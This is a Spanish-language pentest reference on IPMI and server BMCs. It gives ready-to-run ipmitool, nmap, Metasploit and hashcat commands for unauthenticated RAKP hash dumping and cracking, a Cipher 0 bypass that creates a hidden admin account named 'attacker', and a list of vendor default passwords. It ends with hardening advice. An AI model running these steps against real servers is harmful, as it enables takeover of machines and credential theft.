# IPMI — Intelligent Platform Management Interface

IPMI es una interfaz estándar que permite la gestión y monitorización **fuera de banda** de servidores, independientemente del estado del sistema operativo. Funciona incluso si el servidor está apagado, bloqueado o sin sistema operativo — tiene su propio procesador (BMC), memoria y acceso a la red. Opera en el puerto **623** (UDP).

Esto lo hace extremadamente poderoso y, en consecuencia, extremadamente peligroso si está mal configurado o expuesto.

### Conceptos clave

| Concepto                                  | Descripción                                                                        |
| ----------------------------------------- | ---------------------------------------------------------------------------------- |
| **BMC** (Baseboard Management Controller) | El microprocesador embebido que implementa IPMI, independiente de la CPU principal |
| **RMCP+**                                 | Protocolo de red de IPMI para acceso remoto (puerto 623 UDP)                       |
| **IPMI v2.0**                             | La versión actual, con soporte para autenticación RAKP                             |
| **iDRAC**                                 | Implementación de Dell (Integrated Dell Remote Access Controller)                  |
| **iLO**                                   | Implementación de HP (Integrated Lights-Out)                                       |
| **IPMI-over-LAN**                         | Acceso remoto al BMC a través de la red                                            |

### Enumeración

#### Nmap

```bash
# Detección básica
nmap -sU -p 623 target
nmap -sU -sV -p 623 target

# Scripts específicos
nmap -sU -p 623 --script ipmi-version target           # versión del IPMI
nmap -sU -p 623 --script ipmi-cipher-zero target       # vulnerabilidad Cipher 0
nmap -sU -p 623 --script ipmi-dumphashes target        # dump de hashes (vulnerable)
```

#### ipmitool — herramienta de gestión IPMI

```bash
# Instalar
apt install ipmitool

# Obtener información básica del BMC
ipmitool -I lanplus -H target -U usuario -P contraseña mc info

# Enumeración del sistema
ipmitool -I lanplus -H target -U usuario -P contraseña sdr list     # sensores (temperatura, voltaje...)
ipmitool -I lanplus -H target -U usuario -P contraseña chassis status
ipmitool -I lanplus -H target -U usuario -P contraseña fru list     # Field Replaceable Units

# Gestión de usuarios
ipmitool -I lanplus -H target -U usuario -P contraseña user list    # listar usuarios
ipmitool -I lanplus -H target -U usuario -P contraseña user summary

# Control del servidor (con permisos)
ipmitool -I lanplus -H target -U usuario -P contraseña chassis power status
ipmitool -I lanplus -H target -U usuario -P contraseña chassis power on
ipmitool -I lanplus -H target -U usuario -P contraseña chassis power off
ipmitool -I lanplus -H target -U usuario -P contraseña chassis power reset

# Consola serie remota
ipmitool -I lanplus -H target -U usuario -P contraseña sol activate
```

#### Metasploit — módulos IPMI

```bash
# Escanear y obtener información
use auxiliary/scanner/ipmi/ipmi_version
set RHOSTS target
run

# Dump de hashes (RAKP vulnerability)
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS target
run
# Los hashes obtenidos se pueden crackear offline con hashcat (-m 7300)

# Bypass de autenticación (Cipher 0)
use auxiliary/scanner/ipmi/ipmi_cipher_zero
set RHOSTS target
run

# Con Cipher 0 habilitado, crear un usuario administrador sin contraseña:
ipmitool -I lanplus -H target -U "" -P "" -C 0 user set name 16 attacker
ipmitool -I lanplus -H target -U "" -P "" -C 0 user set password 16 Password123
ipmitool -I lanplus -H target -U "" -P "" -C 0 user priv 16 4       # privilegio admin
ipmitool -I lanplus -H target -U "" -P "" -C 0 user enable 16
```

### Vulnerabilidades críticas de IPMI

#### RAKP Authentication Remote Password Hash Retrieval (IPMI 2.0)

Esta es la vulnerabilidad más importante de IPMI 2.0. Durante el handshake de autenticación RAKP, el servidor envía un **hash HMAC-SHA1 de la contraseña** antes de que el cliente se haya autenticado. Esto permite capturar el hash sin necesidad de estar autenticado y crackearlo offline.

```bash
# Con Metasploit
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS target
run
# Output: admin:hash_del_usuario

# Crackear el hash con hashcat (-m 7300 = IPMI2 RAKP HMAC-SHA1)
hashcat -m 7300 ipmi_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 7300 ipmi_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

#### Cipher 0 Authentication Bypass

Algunos BMCs tienen el "Cipher 0" habilitado, que es un modo de autenticación sin cifrado que permite autenticarse con **cualquier contraseña** (incluyendo cadena vacía). Equivale a no tener contraseña.

#### Credenciales por defecto

Los fabricantes usan credenciales predeterminadas que raramente se cambian:

| Fabricante   | Usuario         | Contraseña                                     |
| ------------ | --------------- | ---------------------------------------------- |
| Dell iDRAC   | `root`          | `calvin`                                       |
| HP iLO       | `Administrator` | (generada en etiqueta física, a veces `admin`) |
| Supermicro   | `ADMIN`         | `ADMIN`                                        |
| IBM IMM      | `USERID`        | `PASSW0RD`                                     |
| Lenovo IMM   | `USERID`        | `PASSW0RD`                                     |
| Generic IPMI | `admin`         | `admin`, `password`                            |

### Riesgos y misconfiguraciones

| Riesgo                           | Descripción                                                                                          |
| -------------------------------- | ---------------------------------------------------------------------------------------------------- |
| **RAKP hash dump**               | Cualquiera que pueda llegar al puerto 623 UDP puede obtener hashes de contraseñas sin autenticación  |
| **Cipher 0 activo**              | Autenticación sin contraseña → acceso total al BMC                                                   |
| **Credenciales por defecto**     | Las credenciales del fabricante sin cambiar dan control total del servidor                           |
| **IPMI expuesto a internet**     | El BMC con acceso a internet directo es altamente peligroso                                          |
| **Reutilización de contraseñas** | La contraseña del BMC suele ser la misma que la del sistema operativo, Active Directory o la red     |
| **Control físico total**         | Con acceso al BMC se puede reiniciar el servidor, montar ISOs virtuales, acceder a la consola KVM... |

### Impacto real del acceso al BMC

Obtener acceso al BMC de un servidor es mucho más que acceso al sistema operativo:

* **Consola KVM remota** — ver y controlar el servidor como si estuvieras físicamente delante
* **Virtual Media** — montar una ISO de arranque remota → reinstalar el SO o arrancar desde live CD
* **Power control** — encender, apagar, resetear el servidor en cualquier momento
* **Acceso al SO durante el boot** — interceptar el arranque, cambiar configuración de BIOS, deshabilitar arranque seguro
* **Persistencia absoluta** — el BMC sobrevive a reinstalaciones del SO

> El **RAKP hash dump** es automático con Metasploit y no requiere autenticación previa. Si la contraseña del BMC es débil, el crackeo con hashcat suele ser rápido. Las contraseñas del BMC rara vez se rotan y suelen reutilizarse en otros servicios del servidor.

> IPMI debería estar **siempre en una red de gestión separada y aislada**, nunca accesible desde la red de producción ni desde internet. Si durante un pentest se encuentra el puerto 623 UDP accesible desde la red general, es un hallazgo crítico independientemente de si las credenciales son conocidas.
